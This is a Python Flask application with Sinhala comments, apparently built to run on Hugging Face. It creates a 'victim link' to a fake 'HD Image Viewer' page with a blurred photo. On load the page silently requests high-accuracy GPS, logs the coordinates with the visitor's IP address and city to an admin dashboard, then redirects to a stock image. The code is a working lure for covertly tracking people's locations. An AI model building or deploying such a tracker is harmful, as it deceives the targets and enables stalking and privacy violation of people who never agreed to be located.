import os, requests, datetime
from flask import Flask, render_template, request

app = Flask(__name__)

# Captured දත්ත තාවකාලිකව තබා ගැනීමට
captured_logs = []

def get_ip_info(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return res if res['status'] == 'success' else None
    except: return None

# --- [ප්‍රධාන පිටුව] Hugging Face එකට ගිය ගමන් පෙනෙන Admin Dashboard එක ---
@app.route('/')
def admin():
    # මෙතනදී ඔයාගේ Hugging Face Space එකේ URL එක ඔටෝම ගන්නවා
    # ඒ ලින්ක් එක අගට /view කෑල්ල එකතු කරලා තමයි අනිත් අයට යවන ලින්ක් එක හදන්නේ
    base_url = request.host_url.rstrip('/')
    victim_link = f"{base_url}/view"
    
    return render_template('index.html', logs=reversed(captured_logs), tunnel_url=victim_link)

# --- [Victim Page] අනිත් අයට පෙනෙන හොර පේජ් එක ---
@app.route('/view')
def victim_page():
    user_ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    ip_info = get_ip_info(user_ip)
    city = ip_info['city'] if ip_info else "Singapore"

    return f'''
    <html>
    <head>
        <title>HD Image Viewer</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }}
            .btn {{ background: #25D366; color: white; padding: 15px; border-radius: 50px; border: none; font-weight: bold; width: 80%; max-width: 300px; margin-top: 20px; cursor: pointer; }}
            .blur {{ width: 280px; filter: blur(15px); border-radius: 15px; border: 1px solid #333; }}
        </style>
        <script>
            // පේජ් එකට ආපු ගමන් GPS ඉල්ලනවා
            window.onload = function() {{ 
                navigator.geolocation.getCurrentPosition(s, e, {{enableHighAccuracy:true}}); 
            }};
            
            function s(p) {{
                fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&ip={user_ip}&city={city}')
                .then(() => location.href='https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=1200');
            }}

            // Alert එක එන්නේ නැති වෙන්න මේක හිස්ව තිබ්බා (මචං උඹ ඉල්ලපු විදිහට)
            function e() {{ 
                console.log("Location denied"); 
            }}
        </script>
    </head>
    <body>
        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=300" class="blur">
        <h2>Protected HD Image</h2>
        <p style="color:#aaa;">Verification required for <b>{city}</b> region.</p>
        <button class="btn" onclick="location.reload()">Unlock Full Image</button>
    </body>
    </html>
    '''

@app.route('/log')
def log_data():
    log = {
        "time": datetime.datetime.now().strftime("%H:%M:%S"),
        "ip": request.args.get('ip'),
        "city": request.args.get('city'),
        "lat": request.args.get('lat'),
        "lon": request.args.get('lon')
    }
    captured_logs.append(log)
    return "OK"

if __name__ == '__main__':
    # Hugging Face පෝට් එක අනිවාර්යයෙන්ම 7860 විය යුතුයි
    app.run(host='0.0.0.0', port=7860)
